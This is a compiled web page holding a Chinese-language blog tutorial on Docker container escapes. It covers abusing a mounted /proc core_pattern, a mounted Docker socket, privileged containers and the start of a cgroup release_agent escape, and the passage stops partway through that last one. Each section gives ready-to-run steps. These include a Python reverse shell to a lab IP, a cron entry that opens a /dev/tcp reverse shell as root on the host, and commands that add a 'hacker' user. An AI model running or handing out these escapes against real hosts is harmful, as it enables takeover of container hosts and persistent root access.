import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as e,o as n}from"./app-DS0ZCcmM.js";const l={};function t(h,s){return n(),a("div",null,s[0]||(s[0]=[e(`<h1 id="docker漏洞汇总" tabindex="-1"><a class="header-anchor" href="#docker漏洞汇总"><span>Docker漏洞汇总</span></a></h1><h2 id="docker容器挂载-伪文件系统-procfs-逃逸" tabindex="-1"><a class="header-anchor" href="#docker容器挂载-伪文件系统-procfs-逃逸"><span>Docker容器挂载 (伪文件系统)procfs 逃逸</span></a></h2><p><code>procfs</code>是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时(Docker默认是不会做用户隔离)。</p><p>利用文件<code>/proc/sys/kernel/core_pattern</code>它在Linux系统中，如果进程崩溃了，系统内核会捕获到进程崩溃信息，将进程崩溃信息传递给这个文件中的程序或者脚本。</p><blockquote><p>从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符&#39;|&#39;，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。</p></blockquote><h3 id="环境" tabindex="-1"><a class="header-anchor" href="#环境"><span>环境</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu #搭建环境</span></span>
<span class="line"><span></span></span>
<span class="line"><span>find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;Procfs is mounted.&quot; || echo &quot;Procfs is not mounted.&quot; #检测当前容器是否挂载procfs</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240122201502815.png" alt="image-20240122201502815" tabindex="0" loading="lazy"><figcaption>image-20240122201502815</figcaption></figure><h3 id="利用" tabindex="-1"><a class="header-anchor" href="#利用"><span>利用</span></a></h3><ul><li><p>安装gcc</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>apt update &amp;&amp; apt install -y gcc</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>创建一个用于反弹shell的python文件</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#!/usr/bin/python3</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  os</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> pty</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> socket</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">lhost </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;192.168.59.128&quot;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">lport </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 4444</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">():</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   s </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> socket.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">socket</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(socket.</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">AF_INET</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, socket.</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">SOCK_STREAM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   s.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">((lhost, lport))</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   os.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">dup2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(s.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">fileno</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   os.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">dup2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(s.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">fileno</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   os.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">dup2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(s.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">fileno</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(), </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">2</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   os.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">putenv</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;HISTFILE&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;/dev/null&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   pty.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">spawn</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;/bin/bash&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">   # os.remove(&#39;/tmp/.t.py&#39;)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">   s.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">close</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;__main__&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">   main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>赋予shell权限</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>chmod 777 .t.py</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></li><li><p>设置环境变量</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>host_path=$(sed -n &#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#39; /etc/mtab)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p>因为Linux转储机制对/proc/sys/kernel/core_pattern内程序的查找是在宿主机文件系统进行的。所以从/etc/mtab中提取upperdir，此路径指向容器在宿主机文件中的挂载点，容器内文件系统未提交变动的文件都会在此体现。（最后来解释）</p></blockquote></li><li><p>写入反弹shell到目标proc目录下</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;|</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$host_path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/tmp/.t.py \\rcore&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/host/proc/sys/kernel/core_pattern</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#如果这里写的不对，可以尝试找绝对路径来写</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /proc/mounts</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">xargs</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;,&#39;</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -n</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> workdir</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#workdir=/var/lib/docker/overlay2/895c10fa35d2baddf5230d5051fd48f9246d19ef027403c6ab8093600fc0395b/work 0 0</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#所以绝对路径应该是/var/lib/docker/overlay2/895c10fa35d2baddf5230d5051fd48f9246d19ef027403c6ab8093600fc0395b/merged</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -e</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;|/var/lib/docker/overlay2/895c10fa35d2baddf5230d5051fd48f9246d19ef027403c6ab8093600fc0395b/merged/tmp/.t.py \\rcore&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/host/proc/sys/kernel/core_pattern</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>在容器里运行一个可以崩溃的程序</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" data-title="c" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;stdio.h&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">int</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">void</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)  {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">   int</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> *</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">a  </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> NULL</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">   *</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">a </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">   return</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"># 编译程序并执行</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">gcc t.c </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">o t </span><span style="--shiki-light:#A626A4;--shiki-dark:#56B6C2;">&amp;&amp;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> .</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">t</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240122210529691.png" alt="image-20240122210529691" tabindex="0" loading="lazy"><figcaption>image-20240122210529691</figcaption></figure></li></ul><p>集中解释一下问题</p><blockquote><p>需要理解的是linux核心转储这个机制</p><p>1.Linux转储机制对/proc/sys/kernel/core_pattern内程序的查找是在宿主机文件系统进行的</p><p><code>/proc/sys/kernel/core_pattern</code>是一个内核参数，它决定了core dump文件的生成位置和命名方式。这个查找过程是在宿主机的文件系统上进行的，而不是在容器中的文件系统。</p><p>在这个案例中，我们将其换成了shell文件，并且在初始添加了管道符，这个shell文件将会在宿主机当中被当成程序执行</p><p>2.从/etc/mtab中提取upperdir，此路径指向容器在宿主机文件中的挂载点，容器内文件系统未提交变动的文件都会在此体现。</p><p><code>upperdir</code>是Docker覆盖文件系统（overlay filesystem）中的一个概念，它指容器层的文件系统，用于存放容器内的更改。<code>/etc/mtab</code>文件中记录了系统中所有已经挂载的文件系统，从中可以找到<code>upperdir</code>的挂载信息，也就找到了容器在宿主机中的数据存放位置。</p><p>其实也就是寻找当前容器的文件存储在宿主机的哪个位置</p><p><a href="http://3.xn--6kq63e.t.py" target="_blank" rel="noopener noreferrer">3.关于.t.py</a></p><p>为了更好的隐藏文件，大概是</p></blockquote><h2 id="挂载docker-socket逃逸" tabindex="-1"><a class="header-anchor" href="#挂载docker-socket逃逸"><span>挂载Docker Socket逃逸</span></a></h2><p>Docker Socket 用来与守护进程通信即查询信息或者下发命令。</p><h3 id="环境-1" tabindex="-1"><a class="header-anchor" href="#环境-1"><span>环境</span></a></h3><ul><li><p>创建一个容器并挂载/var/run/docker/sock</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>在容器内安装 Docker 命令行客户端</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exec</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -it</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> with_docker_sock</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /bin/bash</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> update</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> curl</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -fsSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> https://get.docker.com/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li></ul><h3 id="检测" tabindex="-1"><a class="header-anchor" href="#检测"><span>检测</span></a></h3><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ls</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /var/run/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">grep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -qi</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> docker.sock</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &amp;&amp; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Docker Socket is mounted.&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> || </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Docker Socket is not mounted.&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h3 id="利用-1" tabindex="-1"><a class="header-anchor" href="#利用-1"><span>利用</span></a></h3><p>在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker run -it -v /:/host ubuntu /bin/bash</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>在新的容器内执行 chroot，将根目录切换到挂载到宿主机的根目录，其实不挂载也行</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>chroot /host</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p>Docker Socket主要作用是在Docker守护进程（Docker Daemon）与Docker客户端之间进行通信。</p><p>当容器挂载了Socket，能够执行docker的一些命令，例如创建新的容器，这个操作是在docker服务器上进行的</p><p>因此，利用了这一点将宿主机的全部目录挂载进来，相当于有了宿主机的文件操作权，可以写计划任务来反弹shell了</p><p>这个逃逸需要root权限</p></blockquote><h2 id="特权容器逃逸" tabindex="-1"><a class="header-anchor" href="#特权容器逃逸"><span>特权容器逃逸</span></a></h2><h3 id="环境-2" tabindex="-1"><a class="header-anchor" href="#环境-2"><span>环境</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>docker run --rm -it --privileged ubuntu  bash</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>以特权模式启动一个容器</p><h3 id="检测-1" tabindex="-1"><a class="header-anchor" href="#检测-1"><span>检测</span></a></h3><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /proc/self/status</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">grep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -qi</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;00000[1,3]fffffffff&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &amp;&amp; </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Is privileged mode&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> || </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;Not privileged mode&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240124132243071.png" alt="image-20240124132243071" tabindex="0" loading="lazy"><figcaption>image-20240124132243071</figcaption></figure><h3 id="利用-2" tabindex="-1"><a class="header-anchor" href="#利用-2"><span>利用</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>fdisk -l #查看磁盘文件</span></span>
<span class="line"><span>root@4e4245eaefd2:/# fdisk -l</span></span>
<span class="line"><span>Disk /dev/sda: 80.1 GiB, 86000000000 bytes, 167968750 sectors</span></span>
<span class="line"><span>Disk model: VMware Virtual S</span></span>
<span class="line"><span>Units: sectors of 1 * 512 = 512 bytes</span></span>
<span class="line"><span>Sector size (logical/physical): 512 bytes / 512 bytes</span></span>
<span class="line"><span>I/O size (minimum/optimal): 512 bytes / 512 bytes</span></span>
<span class="line"><span>Disklabel type: dos</span></span>
<span class="line"><span>Disk identifier: 0x4a7def5b</span></span>
<span class="line"><span></span></span>
<span class="line"><span>Device     Boot Start       End   Sectors  Size Id Type</span></span>
<span class="line"><span>/dev/sda1  *     2048 167968749 167966702 80.1G 83 Linux</span></span>
<span class="line"><span></span></span>
<span class="line"><span>2.将/dev/sda1挂载到当前容器的目录下，进行写操作</span></span>
<span class="line"><span>mkdir /test</span></span>
<span class="line"><span>mount /dev/sda1 /test</span></span>
<span class="line"><span></span></span>
<span class="line"><span>3.写入计划任务</span></span>
<span class="line"><span>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.59.128/4444 0&gt;&amp;1&#39; &gt;&gt; /test/var/spool/cron/root</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>或者通过添加新用户登录</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>mount /dev/sda1 /mnt</span></span>
<span class="line"><span>chroot /mnt adduser hacker</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="骚姿势" tabindex="-1"><a class="header-anchor" href="#骚姿势"><span>骚姿势</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span># 选择一个包含release_agent的cgroup子系统控制器。</span></span>
<span class="line"><span>cgroup_dir=/sys/fs/cgroup/rdma</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 在其中创建一个子系统test_subsystem。</span></span>
<span class="line"><span>mkdir -p $cgroup_dir/test_subsystem</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 将test_subsystem子系统中的notify_on_release配置为1。</span></span>
<span class="line"><span>echo 1 &gt;$cgroup_dir/test_subsystem/notify_on_release</span></span>
<span class="line"><span></span></span>
<span class="line"><span># 从/etc/mtab中提取此路径指向宿主机的挂载点。</span></span>
